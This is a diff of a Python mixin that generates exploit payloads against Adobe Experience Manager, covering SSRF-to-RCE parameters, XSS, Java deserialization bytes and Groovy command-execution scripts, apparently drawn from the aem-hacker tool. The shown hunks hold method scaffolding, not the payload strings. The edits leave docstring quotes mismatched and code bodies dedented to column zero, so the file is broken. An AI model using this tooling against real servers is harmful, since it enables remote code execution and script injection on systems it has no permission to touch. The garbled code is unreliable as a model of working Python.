@@ -19,7 +19,7 @@ try:
 except ImportError:
 
 """
-    import base64
+import base64
 
 try:
     import uuid
@@ -40,11 +40,11 @@ except ImportError:
 
 
 class PayloadGeneratorMixin:
-    ""
+"""
 Mixin providing payload generation capabilities for various exploits.
 
     Inspired by aem-hacker's hardcoded payloads for SSRF, RCE, XSS, etc.
-    ""
+"""
 def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self._payload_templates: Dict[str, Dict] = {}
@@ -52,7 +52,7 @@ def __init__(self, *args, **kwargs):
 
 
     def _load_default_templates(self) -> None:
-        ""
+"""
 Load default payload templates.""
         # SSRF to RCE payload (inspired by aem_ssrf2rce.py)
         self._payload_templates['ssrf_rce'] = {
@@ -112,7 +112,7 @@ Load default payload templates.""
 
 
     def generate_ssrf_rce_payload(self, fake_aem_host: str) -> str:
-        ""
+"""
 Generate SSRF to RCE payload for AEM exploitation.
 
         Args:
@@ -120,7 +120,7 @@ Generate SSRF to RCE payload for AEM exploitation.
 
         Returns:
             URL parameters string
-        ""
+"""
 template = self._payload_templates['ssrf_rce']
         uuid_val = str(uuid.uuid4())
         fakeaem_encoded = fake_aem_host.replace('.', '%2E')
@@ -137,7 +137,7 @@ template = self._payload_templates['ssrf_rce']
 
 
     def generate_xss_payload(self, payload_type: str = 'reflected', index: int = 0) -> str:
-        ""
+"""
 Generate XSS payload.
 
         Args:
@@ -146,7 +146,7 @@ Generate XSS payload.
 
         Returns:
             XSS payload string
-        ""
+"""
 key = f"{payload_type}_xss" 
         if payload_type == 'swf':
             key = 'swf_xss'
@@ -159,7 +159,7 @@ key = f"{payload_type}_xss"
 
 
     def generate_deserialization_payload(self, payload_type: str = 'java_object_array') -> bytes:
-        ""
+"""
 Generate deserialization payload.
 
         Args:
@@ -167,12 +167,12 @@ Generate deserialization payload.
 
         Returns:
             Payload bytes
-        ""
+"""
 return self._payload_templates['deserialization'].get(payload_type, b'')
 
 
     def generate_groovy_rce_payload(self, command: str = 'whoami') -> str:
-        ""
+"""
 Generate Groovy RCE payload.
 
         Args:
@@ -180,7 +180,7 @@ Generate Groovy RCE payload.
 
         Returns:
             URL-encoded Groovy script
-        ""
+"""
 if command == 'whoami':
             return self._payload_templates['groovy_rce']['whoami']
         else:
@@ -188,18 +188,18 @@ if command == 'whoami':
 
 
     def add_payload_template(self, name: str, template: Dict[str, Any]) -> None:
-        ""
+"""
 Add custom payload template.
 
         Args:
             name: Template name
             template: Template dictionary
-        ""
+"""
 self._payload_templates[name] = template
 
 
     def get_payload_template(self, name: str) -> Optional[Dict[str, Any]]:
-        ""
+"""
 Get payload template by name.""
 return self._payload_templates.get(name)
 
